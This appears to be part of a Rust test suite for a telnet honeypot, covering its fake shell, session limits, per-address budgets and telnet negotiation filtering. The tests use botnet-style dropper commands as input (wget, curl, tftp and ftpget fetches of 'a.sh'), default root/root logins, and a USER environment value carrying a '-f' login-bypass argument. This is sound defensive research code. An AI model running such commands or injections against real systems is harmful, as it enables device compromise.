        assert_eq!(session.commands.len(), 1);
    }

    #[test]
    fn ex8_leaving_keeps_the_commands() {
        let (session, _) = session_for("whoami\nid\n");
        assert_eq!(session.ended, SessionEnd::Left);
        assert_eq!(session.commands, ["whoami", "id"]);
    }

    #[test]
    fn ex8_a_command_with_no_newline_still_counts() {
        let (session, _) = session_for("wget http://example.com/a");
        assert_eq!(session.commands, ["wget http://example.com/a"]);
        assert_eq!(session.urls, ["http://example.com/a"]);
    }

    #[test]
    fn ex8_a_download_is_logged_and_fails() {
        let (session, sent) = session_for("cd /tmp; wget http://203.0.113.9/a.sh\nexit\n");
        assert_eq!(session.urls, ["http://203.0.113.9/a.sh"]);
        assert_eq!(sent, format!("# {}# ", failure_of("wget")));
    }

    #[test]
    fn ex8_a_very_long_line_carries_on_as_the_next_command() {
        let long = "a".repeat(5000);
        let (session, _) = session_for(&format!("{long}\nexit\n"));
        assert_eq!(session.commands.len(), 4);
        assert_eq!(session.commands[0].len() as u64, MAX_COMMAND_BYTES);
        assert_eq!(session.commands[..3].concat(), long);
        assert_eq!(session.ended, SessionEnd::Exit);
    }

    #[test]
    fn ex8_too_many_lines_ends_the_session() {
        let (session, _) = session_for(&"\n".repeat(MAX_COMMANDS_PER_SESSION + 50));
        assert_eq!(session.ended, SessionEnd::OverLimit);
        assert_eq!(session.commands.len(), MAX_COMMANDS_PER_SESSION);
    }

    #[test]
    fn ex8_too_much_text_ends_the_session() {
        let line = format!("{}\n", "a".repeat(2000));
        let (session, _) = session_for(&line.repeat(100));
        assert_eq!(session.ended, SessionEnd::OverLimit);
        assert!(session.stored_bytes <= MAX_STORED_BYTES_PER_SESSION);
    }

    #[test]
    fn ex8_too_many_replies_ends_the_session() {
        let (session, sent) = session_for(&"ps\n".repeat(MAX_COMMANDS_PER_SESSION - 1));
        assert_eq!(session.ended, SessionEnd::OverLimit);
        assert!(sent.len() <= MAX_REPLY_BYTES_PER_SESSION);
    }

    #[test]
    fn ex8_one_line_cannot_get_around_the_limit_on_replies() {
        let (session, sent) = session_for(&"ps;".repeat(600));
        assert_eq!(session.ended, SessionEnd::OverLimit);
        assert!(sent.len() <= MAX_REPLY_BYTES_PER_SESSION);
    }

    #[test]
    fn ex8_keeps_the_commands_if_the_connection_goes_quiet() {
        let mut session = ShellSession::new();
        let mut typed = BufReader::new("whoami\n".as_bytes().chain(GoesQuiet));
        assert!(session.run(&mut typed, &mut Vec::new()).is_err());
        assert_eq!(session.commands, ["whoami"]);
    }

    #[test]
    fn ex8_keeps_the_commands_if_the_visitor_hangs_up() {
        let mut session = ShellSession::new();
        let mut typed = "whoami\nid\n".as_bytes();
        let mut connection = HangsUpAfter { writes_left: 1 };
        assert!(session.run(&mut typed, &mut connection).is_err());
        assert_eq!(session.commands, ["whoami"]);
    }

    #[test]
    fn ex8_never_sends_back_anything_that_was_typed() {
        let typed = format!(
            "{MARKER}\necho {MARKER}\ncat {MARKER}\nbusybox {MARKER}\nwget http://{MARKER}/a\nexit\n"
        );
        let (session, sent) = session_for(&typed);
        assert!(!sent.contains(MARKER));
        assert!(session.commands[0].contains(MARKER));
    }

    // This is the point of the stage. A real listener waits on localhost, and every download
    // in the session names it. If anything ever tried to fetch one, this listener would see it.
    #[test]
    fn ex8_never_fetches_anything() {
        let listener = listen_on_localhost(0).unwrap();
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let ip = address.ip();

        let typed = format!(
            "wget http://{address}/a.sh\n\
             curl http://{address}/a.sh\n\
             wget {address}/a.sh\n\
             tftp -g -r a.sh {ip}\n\
             ftpget {ip} a.sh a.sh\n\
             python3 fetch.py http://{address}/a.sh\n\
             exit\n"
        );
        let (session, sent) = session_for(&typed);
        assert_eq!(session.ended, SessionEnd::Exit);
        assert_eq!(session.urls.len(), 6);
        assert!(sent.contains(failure_of("wget")));

        thread::sleep(Duration::from_millis(100));
        let nobody_came = listener.accept().map(|_| ()).unwrap_err();
        assert_eq!(nobody_came.kind(), io::ErrorKind::WouldBlock);
    }

    #[test]
    fn ex9_passes_on_what_is_written() {
        let (mut visitor, server) = connected_pair();
        let mut writer = WriteLimited::new(&server, Instant::now() + LONG_LIMIT);
        writer.write_all(b"hello").unwrap();

        let mut received = [0; 5];
        visitor.read_exact(&mut received).unwrap();
        assert_eq!(&received, b"hello");
    }

    #[test]
    fn ex9_sends_nothing_after_the_deadline() {
        let (mut visitor, server) = connected_pair();
        let mut writer = WriteLimited::new(&server, Instant::now());

        let error = writer.write(b"late").unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::TimedOut);

        visitor
            .set_read_timeout(Some(Duration::from_millis(50)))
            .unwrap();
        assert!(visitor.read(&mut [0; 4]).is_err());
    }

    // Someone who connects and never reads fills the computer's buffers, and then writing has
    // to wait. This is the other half of the deadline: reading can't hold a place, and now
    // neither can writing.
    #[test]
    fn ex9_a_visitor_who_stops_reading_cannot_hold_up_a_write() {
        let (_visitor, server) = connected_pair();
        // A backstop, so a mistake in your code fails this test instead of hanging it.
        server
            .set_write_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        let started = Instant::now();
        let mut writer = WriteLimited::new(&server, started + SHORT_LIMIT);

        let error = writer.write_all(&vec![0; 64 * 1024 * 1024]).unwrap_err();

        assert_eq!(outcome_of_error(&error), Outcome::TimedOut);
        assert!(started.elapsed() < Duration::from_secs(2));
    }

    #[test]
    fn ex10_a_new_address_has_room() {
        assert!(ShellBudget::new(100, 1000, 10).has_room(IP_A, day_one()));
    }

    #[test]
    fn ex10_checking_uses_nothing_up() {
        let mut budget = ShellBudget::new(100, 1000, 1);
        assert!(budget.has_room(IP_A, day_one()));
        assert!(budget.has_room(IP_B, day_one()));
        assert!(budget.per_ip.is_empty());
    }

    #[test]
    fn ex10_an_address_that_has_spent_its_share_has_no_room() {
        let mut budget = ShellBudget::new(100, 1000, 10);
        budget.spend(IP_A, day_one(), 99);
        assert!(budget.has_room(IP_A, day_one()));
        budget.spend(IP_A, day_one(), 1);
        assert!(!budget.has_room(IP_A, day_one()));
    }

    #[test]
    fn ex10_another_address_still_has_room() {
        let mut budget = ShellBudget::new(100, 1000, 10);
        budget.spend(IP_A, day_one(), 100);
        assert!(budget.has_room(IP_B, day_one()));
    }

    #[test]
    fn ex10_when_the_day_is_used_up_nobody_has_room() {
        let mut budget = ShellBudget::new(100, 150, 10);
        budget.spend(IP_A, day_one(), 100);
        assert!(budget.has_room(IP_B, day_one()));
        budget.spend(IP_B, day_one(), 50);
        assert!(!budget.has_room(IP_B, day_one()));
        assert!(!budget.has_room(IP_A, day_one()));
    }

    #[test]
    fn ex10_a_new_day_starts_again() {
        let mut budget = ShellBudget::new(100, 100, 10);
        budget.spend(IP_A, day_one(), 100);
        assert!(!budget.has_room(IP_A, day_one()));
        assert!(budget.has_room(IP_A, day_two()));
    }

    #[test]
    fn ex10_a_new_address_needs_room_to_be_tracked() {
        let mut budget = ShellBudget::new(100, 1000, 1);
        budget.spend(IP_A, day_one(), 1);
        assert!(budget.has_room(IP_A, day_one()));
        assert!(!budget.has_room(IP_B, day_one()));
    }

    #[test]
    fn ex11_a_wrong_login_is_rejected_as_it_always_was() {
        let (visit, sent) = visit_for("root\nwrong\n");
        assert_eq!(sent, REJECTED);
        assert_eq!(visit.outcome, Outcome::Attempted);
        assert_eq!(visit.shell, None);
    }

    #[test]
    fn ex11_commands_after_a_wrong_login_get_no_reply() {
        let (visit, sent) = visit_for("root\nwrong\nuname -a\n");
        assert_eq!(sent, REJECTED);
        assert_eq!(visit.shell, None);
    }

    #[test]
    fn ex11_a_listed_login_gets_the_shell() {
        let (visit, sent) = visit_for("root\nroot\nwhoami\nexit\n");
        assert_eq!(sent, format!("{LOGGED_IN}{}# ", reply_for("whoami")));
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).commands, ["whoami", "exit"]);
        assert_eq!(session_of(&visit).ended, SessionEnd::Exit);
    }

    #[test]
    fn ex11_keeps_the_username_and_password() {
        let (visit, _) = visit_for("root\r\nroot\r\nexit\r\n");
        assert_eq!(visit.username.as_deref(), Some("root"));
        assert_eq!(visit.password.as_deref(), Some("root"));
    }

    #[test]
    fn ex11_an_empty_password_can_be_on_the_list() {
        let (visit, _) = visit_for("guest\n\nexit\n");
        assert_eq!(visit.outcome, Outcome::LoggedIn);
    }

    #[test]
    fn ex11_leaving_before_the_password_is_left() {
        let (visit, _) = visit_for("root\n");
        assert_eq!(visit.outcome, Outcome::Left);
        assert_eq!(visit.shell, None);
    }

    #[test]
    fn ex11_leaving_during_the_session_keeps_the_commands() {
        let (visit, _) = visit_for("root\nroot\nwhoami\n");
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).ended, SessionEnd::Left);
        assert_eq!(session_of(&visit).commands, ["whoami"]);
    }

    #[test]
    fn ex11_hanging_up_during_the_session_keeps_the_commands() {
        let mut visit = blank_visit();
        let mut typed = "root\nroot\nwhoami\nid\n".as_bytes();
        let mut connection = HangsUpAfter { writes_left: 4 };
        visit.run_login_or_shell(&mut typed, &mut connection, &sample_list());
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).ended, SessionEnd::Left);
        assert_eq!(session_of(&visit).commands, ["whoami"]);
    }

    #[test]
    fn ex11_going_quiet_during_the_session_is_timed_out() {
        let mut visit = blank_visit();
        let mut typed = BufReader::new("root\nroot\nwhoami\n".as_bytes().chain(GoesQuiet));
        visit.run_login_or_shell(&mut typed, &mut Vec::new(), &sample_list());
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).ended, SessionEnd::TimedOut);
        assert_eq!(session_of(&visit).commands, ["whoami"]);
    }

    #[test]
    fn ex12_a_silent_session_ends_at_the_deadline() {
        check_the_pieces_first();
        let (mut visitor, server) = connected_pair();
        visitor.write_all(b"root\nroot\nwhoami\n").unwrap();

        let started = Instant::now();
        let mut visit = Visit::new(SystemTime::now(), LOCALHOST);
        run_shell_visit(&mut visit, &server, SHORT_LIMIT, &sample_list());

        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).ended, SessionEnd::TimedOut);
        assert_eq!(session_of(&visit).commands, ["whoami"]);
    }

    #[test]
    fn ex12_a_slow_drip_cannot_keep_a_session_going() {
        check_the_pieces_first();
        let (mut visitor, server) = connected_pair();
        visitor.write_all(b"root\nroot\n").unwrap();
        thread::spawn(move || {
            for _ in 0..1000 {
                if visitor.write_all(b"\n").is_err() {
                    return;
                }
                thread::sleep(Duration::from_millis(10));
            }
        });

        let started = Instant::now();
        let mut visit = Visit::new(SystemTime::now(), LOCALHOST);
        run_shell_visit(&mut visit, &server, SHORT_LIMIT, &sample_list());

        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(session_of(&visit).ended, SessionEnd::TimedOut);
    }

    // The login and the session share one deadline, so getting in doesn't start the clock again.
    #[test]
    fn ex12_the_login_and_the_session_share_one_deadline() {
        check_the_pieces_first();
        let limit = Duration::from_millis(600);
        let (mut visitor, server) = connected_pair();
        visitor.write_all(b"root\n").unwrap();
        thread::spawn(move || {
            thread::sleep(Duration::from_millis(500));
            let _ = visitor.write_all(b"root\n");
            thread::sleep(Duration::from_secs(3));
        });

        let started = Instant::now();
        let mut visit = Visit::new(SystemTime::now(), LOCALHOST);
        run_shell_visit(&mut visit, &server, limit, &sample_list());

        assert!(started.elapsed() < Duration::from_millis(950));
        assert_eq!(session_of(&visit).ended, SessionEnd::TimedOut);
    }

    #[test]
    fn ex12_a_whole_session_goes_in_the_log() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-log");
        let shared = server_with_shell(&dir, Limits::new(10, 10), roomy_budget());
        let listener = listen_on_localhost(0).unwrap();

        let mut visitor = visitor_of(&listener);
        visitor
            .write_all(b"root\nroot\ncd /tmp; wget http://203.0.113.9/a.sh\nexit\n")
            .unwrap();
        serve_next(&listener, &shared).unwrap();

        assert_eq!(
            reply_to(&mut visitor),
            with_opening(&format!("{LOGGED_IN}{}# ", failure_of("wget")))
        );
        let visits = logged_visits(&dir);
        assert_eq!(visits.len(), 1);
        assert_eq!(visits[0]["telnet"], "");
        assert_eq!(visits[0]["outcome"], "logged_in");
        assert_eq!(visits[0]["username"], "root");
        assert_eq!(visits[0]["shell"]["ended"], "exit");
        assert_eq!(
            visits[0]["shell"]["commands"][0],
            "cd /tmp; wget http://203.0.113.9/a.sh"
        );
        assert_eq!(visits[0]["shell"]["urls"][0], "http://203.0.113.9/a.sh");
    }

    #[test]
    fn ex12_a_wrong_login_on_a_server_with_a_list_is_still_rejected() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-wrong");
        let shared = server_with_shell(&dir, Limits::new(10, 10), roomy_budget());
        let listener = listen_on_localhost(0).unwrap();

        let mut visitor = visitor_of(&listener);
        visitor.write_all(b"root\nwrong\n").unwrap();
        serve_next(&listener, &shared).unwrap();

        assert_eq!(reply_to(&mut visitor), with_opening(REJECTED));
        let visits = logged_visits(&dir);
        assert_eq!(visits[0]["outcome"], "attempted");
        assert!(visits[0].get("shell").is_none());
    }

    #[test]
    fn ex12_a_session_holds_its_place_until_it_ends() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-place");
        let shared = server_with_shell(&dir, Limits::new(1, 1), roomy_budget());
        let listener = listen_on_localhost(0).unwrap();

        let mut first = visitor_of(&listener);
        first.write_all(b"root\nroot\n").unwrap();
        serve_next(&listener, &shared).unwrap();
        wait_for(&mut first, PROMPT);

        // There's no room while the session is open.
        let mut second = visitor_of(&listener);
        serve_next(&listener, &shared).unwrap();
        assert_eq!(reply_to(&mut second), "");

        // Ending the session gives its place back. The thread finishes in its own time.
        first.write_all(b"exit\n").unwrap();
        reply_to(&mut first);
        let deadline = Instant::now() + Duration::from_secs(5);
        loop {
            let mut next = visitor_of(&listener);
            next.write_all(b"root\nwrong\n").unwrap();
            serve_next(&listener, &shared).unwrap();
            if reply_to(&mut next) == with_opening(REJECTED) {
                break;
            }
            assert!(Instant::now() < deadline, "the place never came back");
            thread::sleep(Duration::from_millis(5));
        }
    }

    #[test]
    fn ex12_a_spent_budget_closes_the_shell() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-budget");
        let budget = ShellBudget::new(1, 1_000_000, 100);
        let shared = server_with_shell(&dir, Limits::new(10, 10), budget);
        let listener = listen_on_localhost(0).unwrap();

        let mut first = visitor_of(&listener);
        first.write_all(b"root\nroot\nexit\n").unwrap();
        serve_next(&listener, &shared).unwrap();
        assert_eq!(reply_to(&mut first), with_opening(LOGGED_IN));

        // The same login now gets what the login has always said, with no opening.
        let mut second = visitor_of(&listener);
        second.write_all(b"root\nroot\nexit\n").unwrap();
        serve_next(&listener, &shared).unwrap();
        assert_eq!(reply_to(&mut second), REJECTED);

        let outcomes: Vec<_> = logged_visits(&dir)
            .iter()
            .map(|visit| visit["outcome"].clone())
            .collect();
        assert_eq!(outcomes.len(), 2);
        assert!(outcomes.contains(&"logged_in".into()));
        assert!(outcomes.contains(&"attempted".into()));
    }

    #[test]
    fn ex12_text_passes_through() {
        assert_eq!(decoded(b"root\n"), b"root\n");
        assert_eq!(decoded("é".as_bytes()), "é".as_bytes());
    }

    #[test]
    fn ex12_removes_each_kind_of_request() {
        for verb in [WILL, WONT, DO, DONT] {
            assert_eq!(decoded(&[b'a', IAC, verb, 31, b'b']), b"ab", "{verb}");
        }
    }

    #[test]
    fn ex12_the_byte_after_a_request_is_never_text() {
        for option in [IAC, CR, NUL, b'x', SE, SB] {
            assert_eq!(decoded(&[IAC, DO, option, b'a']), b"a", "{option}");
        }
    }

    #[test]
    fn ex12_removes_a_two_byte_command() {
        for command in [241, 244, 246, SE] {
            assert_eq!(decoded(&[b'a', IAC, command, b'b']), b"ab", "{command}");
        }
    }

    #[test]
    fn ex12_a_doubled_iac_is_a_real_255() {
        assert_eq!(decoded(&[b'a', IAC, IAC, b'b']), [b'a', 255, b'b']);
    }

    #[test]
    fn ex12_removes_a_longer_message() {
        let window_size = [IAC, SB, 31, 0, 80, 0, 24, IAC, SE, b'a'];
        assert_eq!(decoded(&window_size), b"a");
    }

    #[test]
    fn ex12_a_doubled_iac_does_not_end_a_longer_message() {
        assert_eq!(decoded(&[IAC, SB, 31, IAC, IAC, 24, IAC, SE, b'a']), b"a");
    }

    #[test]
    fn ex12_text_inside_a_longer_message_stays_out() {
        let hidden = [&[IAC, SB, 39][..], b"USER", &[IAC, SE][..], b"a"].concat();
        assert_eq!(decoded(&hidden), b"a");
    }

    #[test]
    fn ex12_carriage_return_and_zero_is_enter() {
        assert_eq!(decoded(b"root\r\0"), b"root\r\n");
    }

    #[test]
    fn ex12_other_line_endings_stay_as_they_are() {
        assert_eq!(decoded(b"root\r\n"), b"root\r\n");
        assert_eq!(decoded(b"root\n"), b"root\n");
    }

    #[test]
    fn ex12_a_carriage_return_on_its_own_stays() {
        assert_eq!(decoded(b"a\rb"), b"a\rb");
        assert_eq!(decoded(b"a\r\r\0"), b"a\r\r\n");
        assert_eq!(decoded(&[CR, IAC, WILL, 1, b'a']), b"\ra");
    }

    #[test]
    fn ex12_survives_every_pair_of_bytes() {
        for first in 0..=255 {
            for second in 0..=255 {
                assert!(decoded(&[IAC, first, second, b'a']).len() <= 4);
                assert!(decoded(&[CR, first, second]).len() <= 3);
            }
        }
    }

    #[test]
    fn ex12_the_filter_keeps_only_the_text() {
        let mut filter = TelnetFilter::new(&[b'a', IAC, DO, 31, b'b', b'\n'][..]);
        let mut text = String::new();
        filter.read_to_string(&mut text).unwrap();
        assert_eq!(text, "ab\n");
    }

    #[test]
    fn ex12_a_message_can_arrive_cut_in_pieces() {
        let bytes = [ANSWER_TO_OPENING, b"root\r\n"].concat();
        let mut filter = TelnetFilter::new(OneByteAtATime { bytes: &bytes });
        let mut text = String::new();
        filter.read_to_string(&mut text).unwrap();
        assert_eq!(text, "root\r\n");
    }

    // A read that finds only negotiation has nothing to hand back, but it isn't the end.
    #[test]
    fn ex12_a_read_of_only_negotiation_is_not_the_end_of_the_input() {
        let first_read = [IAC, WILL, 31];
        let mut reader = BufReader::new(TelnetFilter::new(first_read.chain("root\n".as_bytes())));
        assert_eq!(read_command(&mut reader).unwrap(), "root\n");
    }

    #[test]
    fn ex12_the_real_end_of_the_input_is_still_the_end() {
        let mut filter = TelnetFilter::new(&[IAC, WILL, 31][..]);
        assert_eq!(filter.read(&mut [0; 16]).unwrap(), 0);
    }

    #[test]
    fn ex12_keeps_the_negotiation_as_hex() {
        let mut filter = TelnetFilter::new(&[IAC, WILL, 31, b'a'][..]);
        filter.read_to_end(&mut Vec::new()).unwrap();
        assert_eq!(filter.negotiation_as_hex(), "fffb1f");
    }

    #[test]
    fn ex12_a_flood_of_negotiation_cannot_fill_memory() {
        let flood = [IAC, 241].repeat(100_000);
        let mut filter = TelnetFilter::new(&flood[..]);
        filter.read_to_end(&mut Vec::new()).unwrap();
        assert_eq!(filter.negotiation_as_hex().len(), 2 * MAX_TELNET_BYTES_KEPT);
    }

    #[test]
    fn ex12_answering_the_opening_does_not_change_the_login() {
        let typed = [ANSWER_TO_OPENING, b"root\r\nroot\r\nexit\r\n"].concat();
        let (visit, hex) = visit_through_filter(&typed);
        assert_eq!(visit.username.as_deref(), Some("root"));
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert!(hex.starts_with("fffc01fffb1f"), "{hex}");
    }

    #[test]
    fn ex12_negotiation_can_come_between_the_answers() {
        let typed = [b"root\r\n", &[IAC, DO, 1][..], b"root\r\nexit\r\n"].concat();
        let (visit, _) = visit_through_filter(&typed);
        assert_eq!(visit.outcome, Outcome::LoggedIn);
    }

    #[test]
    fn ex12_a_client_that_sends_enter_the_telnet_way_gets_in() {
        let typed = [ANSWER_TO_OPENING, b"root\r\0root\r\0whoami\r\0exit\r\0"].concat();
        let (visit, _) = visit_through_filter(&typed);
        assert_eq!(visit.outcome, Outcome::LoggedIn);
        assert_eq!(session_of(&visit).commands, ["whoami", "exit"]);
        assert_eq!(session_of(&visit).ended, SessionEnd::Exit);
    }

    // Real exploits have been carried here, in a variable sent during negotiation, so this is
    // research you'd lose if the filter simply threw negotiation away. The bytes are made up.
    #[test]
    fn ex12_what_is_hidden_in_negotiation_is_written_down() {
        let message = [
            &[IAC, SB, 39, 0, 0][..],
            b"USER",
            &[1][..],
            b"-f x",
            &[IAC, SE][..],
        ]
        .concat();
        let typed = [&message[..], b"admin\r\nwrong\r\n"].concat();
        let (visit, hex) = visit_through_filter(&typed);

        assert_eq!(visit.username.as_deref(), Some("admin"));
        assert_eq!(visit.outcome, Outcome::Attempted);
        let user_as_hex = "55534552";
        assert!(hex.contains(user_as_hex), "{hex}");
    }

    #[test]
    fn ex12_the_server_speaks_first() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-first");
        let shared = server_with_shell(&dir, Limits::new(10, 10), roomy_budget());
        let listener = listen_on_localhost(0).unwrap();

        let mut visitor = visitor_of(&listener);
        serve_next(&listener, &shared).unwrap();

        // Nothing has been typed yet.
        let mut opening = vec![0; TELNET_OPENING.len()];
        visitor.read_exact(&mut opening).unwrap();
        assert_eq!(opening, TELNET_OPENING);
        wait_for(&mut visitor, LOGIN_PROMPT);
    }

    // This client behaves like the visitors in the logs: it sends nothing until it's been spoken
    // to in telnet, then waits for each prompt in turn.
    #[test]
    fn ex12_a_client_that_waits_to_be_spoken_to_gets_in() {
        check_the_pieces_first();
        let dir = TestDir::new("ex12-waits");
        let shared = server_with_shell(&dir, Limits::new(10, 10), roomy_budget());
        let listener = listen_on_localhost(0).unwrap();

        let mut visitor = visitor_of(&listener);
        serve_next(&listener, &shared).unwrap();

        let mut first_byte = [0];
        visitor.read_exact(&mut first_byte).unwrap();
        assert_eq!(first_byte[0], IAC);

        visitor.write_all(ANSWER_TO_OPENING).unwrap();
        wait_for(&mut visitor, LOGIN_PROMPT);
        visitor.write_all(b"root\r\n").unwrap();
        wait_for(&mut visitor, PASSWORD_PROMPT);
        visitor.write_all(b"root\r\n").unwrap();
        wait_for(&mut visitor, PROMPT);
        visitor
            .write_all(b"wget http://203.0.113.9/a.sh\r\nexit\r\n")
            .unwrap();
        reply_to(&mut visitor);

        let visits = logged_visits(&dir);
        assert_eq!(visits[0]["outcome"], "logged_in");
        assert_eq!(visits[0]["username"], "root");
        assert_eq!(visits[0]["shell"]["urls"][0], "http://203.0.113.9/a.sh");
        assert!(visits[0]["telnet"].as_str().unwrap().starts_with("fffc01"));
    }

    #[test]
    fn ex12_the_log_shows_a_visitor_who_said_nothing() {
        check_the_pieces_first();
        let (visitor, server) = connected_pair();
        drop(visitor);

        let mut visit = Visit::new(SystemTime::now(), LOCALHOST);
        run_shell_visit(&mut visit, &server, SHORT_LIMIT, &sample_list());

        assert_eq!(visit.username, None);
        assert_eq!(visit.telnet.as_deref(), Some(""));
    }

    #[test]
    fn ex13_the_bots_check_gets_its_word_back() {
        assert_eq!(canned_reply("echo SHELL_TEST"), "SHELL_TEST\r\n");
    }

    // This is what the bot did: log in, send the one command and hang up.
    #[test]
    fn ex13_a_bot_that_logs_in_and_hangs_up_sees_the_word() {
        let (visit, sent) = visit_for("root\r\nroot\r\necho SHELL_TEST\r\n");
        assert_eq!(sent, format!("{LOGGED_IN}SHELL_TEST\r\n# "));

        let session = session_of(&visit);
        assert_eq!(session.commands, ["echo SHELL_TEST"]);
        assert_eq!(session.ended, SessionEnd::Left);
        assert_eq!(session.reply_bytes, "# SHELL_TEST\r\n# ".len());
    }

    #[test]
    fn ex13_works_with_a_path_or_in_a_chain() {
        assert_eq!(canned_reply("/bin/echo SHELL_TEST"), "SHELL_TEST\r\n");

        let (_, sent) = session_for("sh; echo SHELL_TEST\nexit\n");
        assert_eq!(sent, "# SHELL_TEST\r\n# ");
    }
}
